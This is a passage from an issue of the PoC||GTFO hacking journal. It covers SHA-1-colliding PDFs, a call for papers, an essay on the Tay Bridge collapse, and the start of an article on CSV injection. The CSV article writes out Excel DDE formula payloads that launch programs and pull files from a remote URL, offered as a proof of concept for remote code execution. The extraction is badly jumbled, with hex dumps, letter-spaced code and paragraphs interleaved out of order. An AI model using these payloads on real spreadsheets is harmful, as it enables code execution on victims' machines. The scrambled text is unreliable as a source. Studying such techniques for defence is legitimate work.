d3
90
00
00 f4
10
03
cf
b6
c118:10
Easy SHA-1 Colliding PDFs with PDFLaTeX.
by Ange Albertini
In the summer of 2015, I worked with Marc
Stevens on the re-usability of a SHA1 collision: de-
termining a prefix could enable us to craft an infinite
amount of valid PDF pairs, with arbitrary content
with a SHA-1 collision.
000:
010:
020:
030:
040:
050:
060:
070:
080:
090:
0a0:
0b0:
0c0:
.% .P .D
\n .1
.h
.2
.0
.S .u .b
.l .t .e
.S .p .a
.t .h
.C .o .m
.r .e .a
.i .s
09 23 39
??
.F .- .1
.0
.o
.0
.R ./ .T
.t .y .p
.r
.6
.c .e
.8
.0
.p .o .n
.m \n FF
.d .e
75 9C 39
..
.b
.R
.y
.e
.3
.j
./
.p
.0
.7
.e
D8
.a
B1
.R
.n
FF
.d
A1
\n .% E2 E3 CF D3
\n .< .< ./ .W .i
.H .e .i .g .h .t
.e
.4
.0
.5
.0
.R ./
.R ./ .C .o .l
.0
.R ./ .L .e
./ .B .i .t .s .P
.t
.8 .> .> \n
FE 00 24 .S .H .A
.! .! .! .! .! 85
C6 3C 4C 97 E1 FF
\n \n
.d .t
.3
.R ./
.F .i
.o .r
.n .g
.e .r
.s .t
.- .1
2F EC
FE 01
do some postprocessing magic: since we can’t actu-
ally build the whole PDF file with the perfect preci-
sion for hash collisions, we’ll just use placeholders for
each of the objects. We also need to tell PDFL A TEX
to disable decompression in this group of objects.
Here’s how to do it in PDFL A TEX. You may have
to put that even before the documentclass decla-
ration to make sure the first PDF objects are not
reserved yet.
\ begingroup
2
\ p d f c o m p r e s s l e v e l =0\ r e l a x
4
\ immediate \ pdfximage width 40 pt {< f o o . jpg >}
6
\ immediate \ p d f o b j {65535}
The first SHA-1 colliding pair of PDF files were 8 \ immediate \ p d f o b j {65535}
\ immediate \ p d f o b j {/ XObject }
released in February 2017. 61 I documented the pro-
10 \ immediate \ p d f o b j {/ Image }
cess and the result in my “Exploiting hash collisions”
\ immediate \ p d f o b j {/DCTDecode}
presentation.
12 \ immediate \ p d f o b j {/ DeviceGray }
\ immediate \ p d f o b j {123456789}
The resulting prefix declares a PDF, with a PDF
object declaring an image as object 1, with refer- 14
\ endgroup
ences to further objects 2–8 in the file for the prop-
erties of the image:
PDF signature
non-ASCII marker
object declaration
image object properties 000:
009:
011:
019:
stream content start
JPEG Start Of Image
JPEG comment
hidden death statement
randomization buffer
JPEG comment
start of collision block 08e:
095:
097:
09b:
0ad:
0bd:
0c0:
%PDF-1.3
%âãÏÓ
1 0 obj
<</Width 2 0 R/Height 3 0 R/Type 4 0 R
/Subtype 5 0 R/Filter 6 0 R
/ColorSpace 7 0 R/Length 8 0 R
/BitsPerComponent 8>>
stream
length: 36
FF D8
FF FE 00 24
SHA-1 is dead!!!
85 2F .. .. 97 E1
byte with a xor
FF FE 01
difference of 0x0C
??
Then we just need to get the reference to the
last PDF image object, and we can now display our
image wherever we want
1 \ edef \ shattered {
\ pdfrefximage \ the \ pdflastximage }
We then just need to actually overwrite the first
eight objects of a colliding PDF, and everything falls
into place. 62 You can optionally adjust the XREF
table for a perfectly standard, SHA-1 colliding, and
automatically generated PDF pair
length: 01??
The PDF is otherwise entirely normal. It’s just
a PDF with its first eight objects used, and with a
image of fixed dimensions and colorspace, with two
different contents in each of the colliding files.
The image can be displayed one or many times,
with optional clipping, and the raw data of the im-
age can be also used as page content under specific
readers (non browsers) if stored losslessly repeating
lines of code eight times.
The rest of the file is totally standard. It could
be actually a standard academic paper like this one.
We just need to tell PDFL A TEX that object 1 is
an image, that the next seven objects are taken, and
61 unzip
62 See
%/Width
%/H e i g h t
%/Type
%/SubType
%/ F i l t e r s
%/C o l o r S p a c e
%/Length
pocorgtfo14.pdf shattered.pdf
https://alf.nu/SHA1 or unzip pocorgtfo18.pdf sha1collider.zip.
6318:11
Bring out your dead! Bugs, that is.
from the desk of Pastor Manul Laphroaig,
Tract Association of PoCkGTFO.
Dearest neighbor,
Our scruffy little gang started this самиздат
journal a few years back because we didn’t much like
the academic ones, but also because we wanted to
learn new tricks for reverse engineering. We wanted
to publish the methods that make exploits and poly-
glots possible, so that folks could learn from each
other. Over the years, we’ve been blessed with the
privilege of editing these tricks, of seeing them early,
and of seeing them through to print.
Now it’s your turn to share what you know, that
nifty little truth that other folks might not yet know.
It could be simple, or a bit advanced. Whatever
your nifty tricks, if they are clever, we would like to
publish them.
Do this: write an email in 7-bit ASCII telling
our editors how to reproduce ONE clever, techni-
cal trick from your research. If you are uncertain of
your English, we’ll happily translate from French,
Russian, Southern Appalachian, and German.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick explanation would do.
Teach me how to falsify a freshman physics ex-
periment by abusing floating-point edge cases. Show
me how to enumerate the behavior of all illegal in-
structions in a particular implementation of 6502,
or how to quickly blacklist any byte from amd64
shellcode. Explain to me how shellcode in Wine or
ReactOS might be simpler than in real Windows.
Don’t tell us that it’s possible; rather, teach us
how to do it ourselves with the absolute minimum
of formality and bullshit.
Like an email, we expect informal language and
hand-sketched diagrams. Write it in a single sit-
ting, and leave any editing for your poor preacher-
man to do over a bottle of fine scotch. Send this
to pastor@phrack org and hope that the neighborly
Phrack folks—praise be to them!—aren’t man-in-the-
middling our submission process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, T G S B
64P o C G T F O
roof
oncept or
et
f
he
ut
uck
And so do you!
And so do I!
A stroke of the brush does not guarantee art from the bristles. Это самиздат.
Compiled for a dozen reasons many dozens of times, the last of which was on March 27, 2019.
0, $0 USD, $0 AUD, 0 RSD, 0 SEK, $50 CAD, 6 × 10 29 Pengő (3 × 10 8 Adópengő), 100 JPC.
5
19
This janky old piano
has a few more tunes!Legal Note: Dolly Parton has given away one hundred million books, and we the editors politely suggest
that you get started in giving away some of your own. Please reproduce this fine journal, and spread the
gift of самиздат to all who would like to read it.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo19.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
https://www.sultanik.com/pocorgtfo/
git clone https://github.com/angea/pocorgtfo
Technical Note: This file, pocorgtfo19.pdf, is valid as a PDF document, a ZIP archive, and a HTML
page. It is also available as a Windows PE executable, a PNG image and an MP4 video, all of which have
the same MD5 as this PDF.
Cover Art: The cover illustration from this release is a Prévost engraving of a painting by Léon Benett
that was first published in Le tour du monde en quatre-vingts jours by Jules Verne in 1873.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3
(280 mm x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to
form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo19.pdf -o pocorgtfo19-book.pdf
Man of The Book
Editor of Last Resort
TEXnician
Editorial Whipping Boy
Funky File Supervisor
Assistant Scenic Designer
Scooby Bus Driver
2
Manul Laphroaig
Melilot
Evan Sultanik
Jacob Torrey
Ange Albertini
Philippe Teuwen
Ryan Speers19:01
Let’s start a band together!
Neighbors, please join me in reading this twen-
tieth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse
engineering and the study of weird machines. This
release is a gift to our fine neighbors in Heidelberg,
Canberra and Knoxville.
If you are missing the first nineteen issues, we
suggest asking a neighbor who picked up a copy of
the first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiv-
ing holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, the thirteenth in Montréal, the fourteenth in
São Paulo, San Diego, or Budapest, the fifteenth
in Canberra, Heidelberg, or Miami, the sixteenth
release in Montréal, New York, or Las Vegas, the
seventeenth release in São Paulo or Budapest, the
eighteenth release in Leipzig or Washington, D.C.,
or the nineteenth in Montréal. Two collected vol-
umes are available through No Starch Press, wher-
ever fine books are sold.
On page 5, our editor in chief regales us with
tales of coke! Neither the soft drink nor the alka-
loid, he speaks here of the refined coal that ushered
in the Industrial Revolution, the compromises nec-
essary to build an affordable bridge from wrought
and cast iron when steel has yet to be invented, and
the disastrous collapse of the Tay Bridge in Scot-
land. What modern marvels are made affordable
and efficient by similar fancy tricks, only to collapse
under an adversarial load?
Time and again in this journal, we have seen
that regular expressions have been used in fragile
code that rules our lives. On page 11, Jeff Dileo
presents a trick for formatting Powershell scripts as
email addresses, such that they are executed when
exported by spammers into Microsoft Excel as CSV
textfiles.
Every enterprising young lady and gentleman
who has delved into datasheets and instruction sets
has a moment of curiosity when a field is marked as
undefined, or when it is defined to a constant with no
explanation of that constant’s meaning. Eric Davis-
son shows on page 17 that, at least in the instruc-
tions of modern ARM executables, it is possible to
scramble the constants, breaking compatibility with
disassemblers while executing exactly as intended on
real hardware. Perhaps you, dear reader, can do the
same to other architectures?
After our paper release, and only when qual-
ity control has been passed, we will make an elec-
tronic release named pocorgtfo19.pdf. It is a valid
PDF document, an HTML page, and a ZIP file
filled with fancy papers and source code. You might
also find pocorgtfo19.exe, pocorgtfo19.png and
pocorgtfo19.mp4 with the same MD5 hash. On
page 21, our very own Ange Albertini will show you
show he made this pileup of a polyglot and hash
collisions.
There’s a lot of fancy work that can be do with
homoglyphs in UTF8, but what other clever things
can be done with it? Ryan Speers and Travis Good-
speed have been fuzzing UTF8 interpreters not for
crashes, but for differences of opinion on string le-
gality. On page 39, they will show you how to make
a string that is happily allowed by Java and Golang,
but impossible to insert into a PostgreSQL table.
3shut down delays can be used as a communications
channel. Isn’t that wild?
Gabriel Radanne presents his Camelus Docu-
mentum on page 60, a PDF file that is also exe-
cutable OCaml bytecode. The Sapir-Albertini hy-
pothesis, you heard of it here first, neighbors!
You might remember Alexei Bulazel from his
hilarious AVLeak research at WOOT, in which he
exfiltrated file and registry listings from cloud an-
tivirus products through thousands of preselected
false positives and a fresh unpacker. 1 Windows De-
fender has been a pet research project of his, and
on page 64, he explains the internals of its emulator.
You’ll learn how its custom apicall instruction can
be added to IDA Pro, how to add an output chan-
nel for printf() debugging from the emulator, and
how to bypass Microsoft’s mitigations against abuse
of this emulation layer.
On page 80, the last page, we pass around the
collection plate. Our church has no interest in bit-
coins or wooden nickels, but we’d love your donation
of a reverse engineering story. Please send one our
way.
Even the best among us, having hoarded elec-
tronic components for years, sometimes lack that
one nifty piece that would make a project work.
Page 44 presents one such project, a vacuum fluores-
cent display driver that was saved by clever thinking
and a refusal to give into frustration.
Rodger Allen presents us, on page 47, with a
clever tool in Haskell that hides text in the unused
space of .bmp and .ico palettes. You just might
find a copy of its source code in the favicon of your
favorite PoCkGTFO mirror!
We relax for intermission on page 53 with a de-
lightful ditty by Dr. EVM and MMX Show, their
hit single, The Pages of PoCkGTFO!
So there’s this idea that wherever two users share
a constrained resource, they can use it as a com-
munications channel, just by hogging the resource
or leaving it be. The faster and more tightly con-
strained the resource is, the better to communicate
with it. On page 55, Lorenzo Benelli shows us that
vector multiplication on Intel’s AVX instruction set
is a constrained resource, and that its startup and
1 unzip
pocorgtfo19.pdf avleak.pdf
419:02
Of Coal and Iron
by Manul Laphroaig, Engineer
Gather ’round, neighbors. The Christmas sea-
son is behind us, but some cold days still lie ahead,
and there’s still time for a hearty fireside chat and
a pint. And as I raise my pint and think of fire-
places and of stockings hung by the chimneys with
care, my thoughts turn to the thing that had to do
with all of these and warmed the hearts and limbs
of geeks of the ages past: coal.
These days, neighbors, hardly anyone gets coal in
their stockings, and the coal-fed heating oven closest
to you is likely in that Victorian novel on your book-
shelf (unless you are in Berlin, neighbor, in which
case coal might still be your winter friend). But this
pint of pale ale, at least, is a reminder of the times
when coal was something every geek of technology
cared about.
You see, neighbors, pale ale was made possible
by the same thing that made the railway and the rest
of the Industrial Revolution: coke, which is to coal
as charcoal is to wood. Malts used to be dried with
wood or peat fires, and that meant smoke and darker
malts. Raw coal, although cheaper, could not be
used, because hardly anyone likes their beer to smell
of sulfur. Coke, on the other hand—once the pro-
cess for its production got figured out, which in Eu-
rope happened in late 16th–early 17th century—was
a smokeless fuel. Coke ushered in the era of lighter,
“pale” malts, and by the end of the 17th century
changed our idea of a neighborly pint. Which was
nothing compared to how coke changed the ideas of
distance and physical neighboring.
Chances are, neighbor, that you are reading
this thanks to the Network of Networks, other-
wise known as the Internet, and that a few of your
other favorite things also need connectivity. But of
course the Internet was not the first physical net-
work of networks. It wasn’t even the first network
of metal that made the far things and places pre-
viously unreachable—except to the very few and at
a great expense—reachable on the cheap. That net-
work was the railway, and it would not have hap-
pened without coke—and, of course, its best friend,
iron.
Just how exciting was that railway network? you
might ask. Jules Verne’s Around the World in Eighty
Days, an engraving from which graces this edition’s
cover, was prompted by the news report that the
world’s public transport network of railways and
steam boat routes was almost complete for circum-
navigation, missing just some 140 miles in India.
This was the news of the age—and the book became
Verne’s most popular one, prompting many real-life
journeys around the globe.
In Europe the process for smelting iron 2 with
coke was figured out around the beginning of the
17th century. The inventor of record, Abraham
Darby (also called Abraham Darby the Elder, as
his son and grandson of the same name continued
2 It
goes something like this. Iron in nature tends to be all tied up in oxides, but, given the choice, oxygen really prefers
carbon. So if you heat it all up in a scene that’s just right, like a blast furnace, iron gets reduced out. Just think of
2Fe 2 O 3 + 3C → 4Fe + 3CO 2 as nature’s distracted boyfriend meme—except that iron and carbon remain best friends, and
the intricacies of their relationship have been the subject of countless bedside books of the geeks of the early 1900s, such as
H.M. Howe’s Iron, Steel, and Other Alloys, which you’ll find in the feelies. This is true steampunk, neighbors, and truer
romance of the elements is yet to be written, despite the fact that the iron obtained through smelting was called “pig iron.”
5to further the relationship of coal and iron), was in-
spired by seeing coke being used in malt ovens. Be-
fore then, smelting iron required charcoal. This was
good enough for swords and similar items of expen-
sive blacksmithing, but rather limited the amount
of iron one could smelt.
Not only trees take a while to grow, and Britain’s
timber was already in scarce supply by 1700s, but
charcoal doesn’t pile up so well with iron ore. So
coke both saved the trees and allowed for much
larger blast ovens, resulting in much cheaper iron, in
much larger quantities. It was initially not as good
as hand-hammered wrought iron, but it was good
enough, and there was enough of it to be poured
into casts, at a fraction of the cost. So much, in
fact, that one could make buildings, bridges, and
railroads out of it.
In some 50 years cast iron made its way from
pots and pans to what we now call critical infras-
tructure. It went from the first coke-powered blast
furnaces set up by Abraham Darby in 1709 to the
icons of the Industrial Revolution such as the Crys-
tal Palace of the London’s Great Exhibition of 1851
and the great cast iron bridges such as the 2.75-mile
long Tay Bridge of 1879 across the Firth of Forth.
But the choice between infrastructure you can af-
ford right now and the one you can’t is pretty easy,
and so is the employer’s choice between labor that
can be had on the cheap and the expert labor that’s
scarce. The march of the cheap technology cannot
be stopped—think of Javascript and IoT.
Who said IoT? Neighbor, what is that bottle over
on that shelf right next to the divine nectar of Islay?
Indeed, it is the Glenrothes scotch, and so suitable
for the story I am going to tell, for the first of its
kind, they say, was distilled on the same day it hap-
pened. Give me a generous pour, neighbor, and take
another, for the story is not a happy one.
This is the story of a great feat of infrastructure,
the engineer knighted for it, and not surviving it by
even a year. This is the story of the Tay Bridge.
The time cast iron took to get adopted for major
infrastructure projects was not accidental, as chem-
ical impurities of coke were still larger and less con-
trollable than those of charcoal, and defects such as
those caused by gas bubbles were inherent in the
casting process. Also, cast iron is hard and com-
presses well, but is brittle, because it still contains
a fairly large amount of carbon and slag, in a het-
erogeneous alloy structure, which is one of the many
subtle and fascinating phases of the relationship be-
tween iron and carbon. So cast iron was not without
its downsides.
Beautiful Railway Bridge of the Silvery Tay!
With your numerous arches and pillars
in so grand array,
And your central girders,
which seem to the eye
To be almost towering to the sky.
The greatest wonder of the day,
And a great beautification to the River Tay,
Most beautiful to be seen,
Near by Dundee and the Magdalen Green.
– William McGonagall, 1879
6week after Queen Victoria on June 20, 1879, crossed
the celebrated Tay Bridge, an engineering marvel of
the day and an economical one at that.
The Tay Bridge used an ingenious and cost-
effective structural scheme, which combined cast
iron columns with wrought-iron cross-bracing. It
combined the strengths of the two kinds of mate-
rials: the cheapness and hardness of cast iron, and
the tensile strength of the more expensive wrought
iron. Unlike cast iron, wrought iron could bend
without breaking, as the slag in its microstructure
was shaped by hammering and rolling (i.e., work-
ing it, hence wrought in its name) into fibers. 3 The
wrought-iron braces and tiebars stabilized the open-
lattice piers by linking the cast iron columns. The
structure had to be light enough to carry the weight
of the lattice girders and itself, given the limited
support the tricky river bed could offer. The max-
imum windload observed across the Firth of Forth
was taken into account, too, rather than adding an
arbitrary allowance.
The Tay Bridge was designed by Sir Thomas
Bouch, the inventor of the railway ferry and
the lattice girders of railway bridges, the design
you can still see on the Manhattan Bridge, San
Francisco–Oakland Bay Bridge, and many smaller
bridges. The famous Eiffel Tower uses the same lat-
tice principle.
The Tay Bridge exemplified the engineering ap-
proach that brought Sir Thomas to fame and knight-
hood: that it was the duty of the engineer to ac-
complish his work without extravagance and waste,
making it solid and substantial, but only just as solid
and as substantial as required by the circumstances.
Through Sir Thomas’ designs, many clients in need
of railway connectivity were able to actually afford
it. In his projects he used the cheapest technolo-
gies, like cast iron columns for bridges, and used
advice on the wind loads from experts such as the
Astronomer Royal—whom we’d now call data scien-
tists or perhaps climate scientists—to get the safety
allowances just right for the specific tasks rather
than the excessive one-size-fits-all. This approach
brought him fame, and, eventually, knighthood, a
3 These days, wrought iron is a thing of the past, because mild steel gives the same structural properties without the slag, due
to its iron-carbon structure layering of iron allotropes. But at the time steel production still could not compete with wrought
iron.
7foundry foreman and the bridge maintenance inspec-
tor, each acting within their normal layers of compe-
tence and trusting the judgment of experts in other
layers. With so many people involved, layers of en-
gineering abstraction once again became boundaries
of competence.
The combined effect of these good faith opti-
mizations was wilder and more deadly than anyone
could predict. Although the inquiry board members
disagreed on whether the bridge as designed would
have stood if its workmanship were perfect or close,
it was abundantly clear that continuing the busi-
ness of cast iron structures as usual was too risky.
Several major bridges and viaducts were abandoned
and redesigned or condemned and eventually re-
placed. Cast iron designs gave way to more expen-
sive wrought iron (think Eiffel Tower), and then the
steel industry caught up and made wrought iron ob-
solete.
The stone pier stumps of the original Tay Bridge,
though, are still visible next to the new bridge.
Then, on Sunday the 28th of December 1879, the
Tay Bridge collapsed to high winds as a train was
passing through it, killing all aboard.
Beautiful railway bridge of the silv’ry Tay
Alas! I am very sorry to say
That ninety lives have been taken away
On the last sabbath day of 1879
Which will be remember’d
for a very long time.
– William McGonagall, 1880
————————
What brought the bridge down? Was it poor de-
sign or flaws in the workmanship? An inquiry board
set up to investigate the deadly collapse brought
to light many things, such as the ingenious prac-
tices of the foundry workers to disguise the casting
flaws they considered minor by filling them in with
a paste of beeswax, iron filings, etc., that appeared
to be metal when burnished. Another practice that
turned out to be common among moulders was to
cast the holes for bolts when casting the columns,
rather than drilling them afterwards. This made the
holes conical rather than cylindrical, putting more
load from the bolt on the narrow edge end, crushing
the bolt’s thread, allowing extra play for the bolted
tiebars, and weakening the overall lattice structure
as a result. As the windload calculations were traced
to the authoritative books of the day and redone,
questions were raised whether the wind speeds in
the respective formulas were meant to be instanta-
neous maximal values at a point or average values
calculated over time or over the length of a bridge’s
span, which were smaller.
Sir Bouch was known for designs that optimized
costs. The makers of the bridge’s columns added
their own optimizations to the casting processes:
casting bolt holes while the column was cast was
much cheaper than boring them afterwards. Bolts,
in turn, were cheaper than pins. During the inquiry
it transpired that Sir Bouch did not know that the
bolt holes were cast as a common practice, while the
casters did not think the difference important. In
turn, the casters had concerns about the attachment
of tying braces, “knowing how treacherous a thing
cast iron is”, but assumed the engineers knew and
compensated for the weaknesses with redundancy.
The bridge as built was the sum of many in-
dependent optimizations, from the overall design
to lower its weight to the labor of casting its iron
columns. All of these optimizations were made in
good faith, from the chief engineer down to the
BEAUTIFUL new railway bridge of the
Silvery Tay,
With your strong brick piers and buttresses
in so grand array,
And your thirteen central girders,
which seem to my eye
Strong enough all windy storms to defy.
–William McGonagall
And so ends this story of coal, iron, and crit-
ical infrastructure, neighbors. But all of this had
happened before, and it will all happen again.
————————
Although our networks are not of iron and car-
bon, we too have had miraculous breakthroughs
that, like coke, allowed us to scale them far beyond
the limits any sane economist would’ve thought pos-
sible. Our networks and artifacts too are subject to
the same real world forces that favor engineering
them on the cheap, and our choices of materials by
brittleness and the skill needed to work them are
eerily similar.
Our boundaries of competence are as strong as
ever, and our drive to optimize on both sides of an
abstraction boundary is just as disastrous. Nor have
we any lack of “evidence-based” expert advice that
looks so authoritative in a book or in powerpoint,
but may not even use relevant metrics.
Indeed, our hardware has more kinds of Spectres
than a Victorian ghost novel.
89It is hard to fault the CPU engineers who, in pur-
suit of affordable performance, introduced the cache.
The cache is and will likely remain one of the break-
through computing inventions that delivered mirac-
ulous improvements on a budget, suddenly making
the impossibly huge computations actually econom-
ical. The cache allowed programmers to be effective
without honing the finer skills of understanding and
hand-optimizing the memory footprint of their algo-
rithms. Just as with cast iron, much larger edifices
could suddenly be constructed without rare and ex-
traordinary skill, their occasional defects ignored or
polished over.
Then came speculative execution. Quite hard to
get right and quite impossible to fully understand,
it became another miracle, creating another layer
of abstraction that just worked and was assumed
perfect by all the designs above it. Graduate-level
architecture textbooks extolled its virtues without
quite explaining how it could be tractably imple-
mented or meaningfully explored in an actual CPU
on one’s desk.
Just as with the Tay Bridge, independent good-
faith optimizations piled up until no one could ex-
actly understand the effects of their composition and
predict their results. Instead, we replaced under-
standing with cost metrics and supposedly authori-
tative benchmarks, trusting them to capture every-
thing that matters, just as poor Sir Bouch did, and
forged on, optimizing the hell out of everything we
could.
Every profession has its temptations that are
subtle and hard to resist, and that pave the road
to hell not just with good intentions but with high-
grade ingenuity in pursuit of these intentions. Op-
timizing to benchmarks as if these benchmarks rep-
resented reality is ours. It calls to our competitive
spirit and entices us with the beauty of the well-
defined contest. It helps us show off miracles of
clever winning solutions.
Miracles create a taste for more miracles. Opti-
mizations create an appetite for more optimizations
across the board. Since the combined effects of opti-
mizations become hard to understand, metrics and
benchmarks proliferate, become the proxy of reality,
and eventually get mistaken for the whole of reality.
This works for a while, with a feverish build-up of
critical dependencies and their proliferation. Then
reality strikes back and reminds us that composition
is a really, really hard problem, and that measuring
a system in any number of ways is no substitute for
understanding how it works across the layers, from
top to bottom.
Who needed exact understanding of CPU op-
timizations when the benchmarks all agreed that
miraculous improvements have been achieved? Who
would argue with the carefully curated sets of
computations-that-mattered, and which millions of
dollars in pure engineering effort have been spent to
tune CPUs to? Certainly not the former students
who spent their advanced architecture courses cal-
culating weighted averages of instruction mixes to
assert that one ISA was superior to another.
It is said that generals always prepare to fight the
previous war. Just in case we are tempted to feel su-
perior to these proverbial generals, let us remember
that several generations of CS and CE students have
been made to reenact the benchmark battles of the
RISC vs CISC war in lieu of an actual education in
their contemporary CPU microarchitectures.
Just as poor Sir Bouch, we allowed the metrics
that have been useful to a point to get entrenched
in our thinking and our processes. We forgot that,
unlike math and mechanisms, metrics have no life
of their own and will borrow it from other things.
Bouch’s countryman, the economist Charles Good-
hart, formulated a mild version of this observation
as “When a measure becomes a target, it ceases
to be a good measure.” But as we see, neighbors,
the truth deserves much harsher words: metrics are
vampires. When allowed, they will drink the profes-
sion’s lifeblood, and, if the hapless engineers are too
unlucky, will take lives as well.
We’ve had our fair warnings. So far our Tay
Bridge moments have been largely bloodless. They
will keep coming, though, because metrics, bench-
marks, and layers of abstraction tend to extract
their cost as soon as we mistake them for reality
or chase them too doggedly.
Remember the bridge over the silvery Tay, neigh-
bors, watch your allowances, trust the experts and
the metrics only so far as the wind can blow them,
and be sure you understand the workmanship and
the optimization shortcuts of at least two layers
down. Amen.
1019:03
On CSV Injection and RFC 5322
by Jeff Dileo
The world is a dark place full of hosts that refuse
to communicate for fear that their messages are mal-
formed. In this PoC, I hope to spread the good word
by injecting remote code execution into the humble
email address by way of the CSV.
character sequences into a CSV file. However, the
name is a misnomer, as it is based entirely on em-
bedding non-CSV structures into CSV files with the
expectation that the file will be opened in an oth-
erwise insecure spreadsheet application. While the
above CSV data is all there is to CSV (I implore
you not to heed the blatant lies of RFC 4180, which
claims the lines should be separated by DOS CRLF
sequences), there are those who would try to port
their binary format “macro” extensions to the hum-
ble CSV. I speak of Excel and its ilk, who would
go so far as to process their “function” structures
from a CSV file, but be so stingy as not to embed
them when saving to one. Such functions enable the
arbitrary execution of code, a “feature” generally fa-
vored by the neighborly sorts of folk who appreciate
a good pwn.
You down with C.S.V.?
(Yeah, you know me.)
The comma-separated values (CSV) “format” exists
for three reasons, and three reasons alone. It pro-
vides for the anti-GPL SaaS developer a format with
which to serialize trite data for irate customers. It
provides for good neighbors who would parse data
in functional languages. And it provides for the
wayward sheep of the world, who invoke the demon
Excel with a pound of their flesh. Much has been
written on the wholesome insecurity of office suite
software. But I say unto you, an unexplained string
of bytes to start a calculator is not a PoC to drink
to. There is a deep irony in the fact that none of
these writings provide a proper explanation for the
payloads they purvey, yet equally provide not for
the ne’er-do-well script kiddie.
CSV is a deceivingly simple text-based for-
mat not for storing “records” and “fields,” as the
Wikipedia article would have you believe, but is
instead a serialization format for raw spreadsheet
data. As such, I entice you to enter the following
text into a file using the means available to you.
Calling Excel Functions
MS Excel supports a large list of functions with
which an enterprising neighbor could crunch all sorts
of numbers for all sorts of reasons.As a small digres-
sion, I remind all good neighbors of Benford’s law
as a ward against the corrupting influence of these
seemingly limited functions. As covered elsewhere,
there are many ways to invoke them from a cell:
=SUM(65,65)
+SUM(B3,C3)
+3+SUM(B3,C3)
A cell not a Title A, Always Fish
1, Fish
2, Fish
"Multi
line", Fish
"Comma,comma", Fish
"Q""uot""e", Fish
Red, Fish
Blue, Fish
-SUM(B4,C4)
=SUM(B5,C5)*SUM(B5,C5)
Additionally, Microsoft, in a move to convert the
flock of Lotus worshipers, has also provided an alias
to their = operator in the form of the familiar @ sigil.
Praise the Helix!
“CSV injection” is an attack whereby a vulnera-
ble application is coerced into embedding dangerous
@SUM(B2,C2)
11For those wishing to scratch their RE itch, I leave
as an exercise to the reader exploring the implemen-
tation of the OCT2HEX function. Both of these will
result in the same (expected) value.
When called like this, Excel will search the “cur-
rent” directory for the file dde.xlsx. If the file con-
taining this DDE reference was opened from Ex-
cel, it will search the Desktop, otherwise Excel will
search in the Documents directory. It will then at-
tempt to load row 2, column 3 from sheet “Sheet1.”
However, It should be noted that even when invok-
ing Excel as the service, warning prompts will be
raised to the user. The first is a generic prompt in-
dicating that “external sources” could be “unsafe.”
Clicking “Update” will result in Excel prompting
again, asking if it is okay for ’EXCEL.EXE -X’ to be
started; the answer is almost always no. Further-
more, dear neighbors, Excel is more than willing to
take a full file path, or even a URL to a remote
resource, to load a file. However, the same exact
prompts will ensue when opening them if they have
such constructs.
=OCT2HEX(20240501)
=OCT2HEX("20240501")
DDE For You And Me
Dynamic Data Exchange (DDE) is a godless “IPC”
mechanism featured across the Microsoft Office ap-
plications, supposedly to enable them to pull real-
time data from a service. I say “supposedly” be-
cause it is a bygone feature that is not used by real
people and modern Windows does not appear to in-
clude any usable DDE services that run by default.
Unfortunately, because DDE is so old, a server can
only be implemented in VB6 (for which you’d be
hard pressed to develop without an IDE on modern
Windows) or via obtuse C++ APIs. Implementing
a DDE server is left as an exercise to the reader;
however, if an article from Microsoft itself is to be
believed, 4 DDE can be used to dynamically update
cells within an Excel spreadsheet. I wonder what a
neighbor could do with that!
In Excel, DDE “services” are not called using
syntax of Excel functions. For an unknown reason
lost to time, they use a pipe character and an excla-
mation mark as delimiters as described in the only
Microsoft reference on the subject. 5
=Excel|’C:/path/to/dde.xlsx’!’R1C1’
=Excel|’https://example.tld/dde.xlsx’!’R1C1’
Observant neighbors (who haven’t fallen asleep
yet) will notice something odd about that warning
message. Indeed, as you may have suspected, Excel
will simply take the Excel part before the pipe, cap-
italize it, and run it as a command. As such, we not
only can invoke Excel, but as we are executing com-
mands from Excel’s file path, WE CAN INVOKE
WORD!
=winword|’https://example.tld/dde.docx’!z
=ddeserver|’topicname’!itemname
PowerShell, One Gets Used to It
Excel itself also runs as a DDE server. It is there-
fore possible to use a DDE command that commu-
nicates with another Excel process. However, this
does not appear to work across different logged-in
users. The formatting is a bit wonky, but another
active Excel process will generally be started such
that any changes made in the referenced instance are
immediately reflected in the referencing instance.
I’m sure all the neighbors following along are wait-
ing to hear the good word of PowerShell. Seeing as
it is all the bad parts of Python and Zsh combined,
and it is in the default Windows PATH, we should
be able to invoke it with glee. Lo, and behold:
=powershell|’calc’!z
. . .which does not work. Alas, DDE is so an-
cient that it only supports the 8.3 filename syntax.
POWERSHELL.EXE is simply too long, and Excel trims
it down to POWERSHE.EXE, the Windows version of
She-Ra. But alas, POWERSHE.EXE does not exist on
standard Windows images. What are we to do, fel-
low neighbors? For now, I think we have to dig deep
=Excel|[dde.xlsx]Sheet1!R2C3
4 https://support.microsoft.com/en-us/help/247412
5 https://docs.microsoft.com/en-us/windows/desktop/dataxchg
12and invoke PowerShell through CMD.EXE, a shell so
terrible Windows 10 replaced it with Bash.
which is our CMD.EXE input. Additionally, we cannot
simply replace the inner single quotes with double
quotes, as CMD.EXE will strip them from the argu-
ments passed to PowerShell. However, CMD.EXE will
pass them if they are backslash-escaped. But, if you
were thinking that we would start backslashing our
backslashes, I can safely confide, fellow neighbors,
that Xzibit will not be interrupting this PoC. DDE,
much like CSV, does not believe in the just backslash
